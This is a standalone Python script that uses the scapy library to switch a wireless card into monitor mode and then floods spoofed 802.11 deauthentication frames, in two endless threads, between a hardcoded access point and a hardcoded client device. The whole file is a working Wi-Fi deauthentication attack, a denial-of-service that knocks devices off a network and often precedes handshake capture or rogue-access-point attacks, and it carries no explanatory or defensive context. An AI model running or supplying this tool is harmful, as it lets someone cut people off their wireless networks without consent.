#!/usr/bin/env python3
from scapy.all import *
import os

def monitorMode(iface="wlo1",mode=True):
  toMode=""
  if mode==True:
    toMode="monitor"
  else:
    toMode="managed"
  os.system('ifconfig ' + iface + ' down')
  os.system('iwconfig ' + iface + ' mode '+toMode)
  os.system('ifconfig ' + iface + ' up')
  if (mode==False):
    os.system('service network-manager restart')

def for_ap(frame, interface):
  while True:
    sendp(frame, iface = interface, count = 20, inter = .001)


def for_client(frame, interface):
  while True:
    sendp(frame, iface = interface, count = 20, inter = .001)


def main():
  monitorMode(iface="wlo1",mode=True)
  bssid="e4:9e:12:79:e2:a6".upper()
  client="B4:C0:F5:32:26:4D".upper()

  pck2client = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth() 
  pck2bssid = RadioTap()/Dot11(type=0,subtype=12,addr1=bssid,addr2=client,addr3=bssid)/Dot11Deauth() 
  t1 = Thread(target = for_ap, args = (pck2bssid, "wlo1"))
  t1.start()
  t2 = Thread(target = for_client, args = (pck2client, "wlo1"))
  t2.start()

#  monitorMode(iface="wlo1",mode=False)

if __name__ == '__main__':
    main()
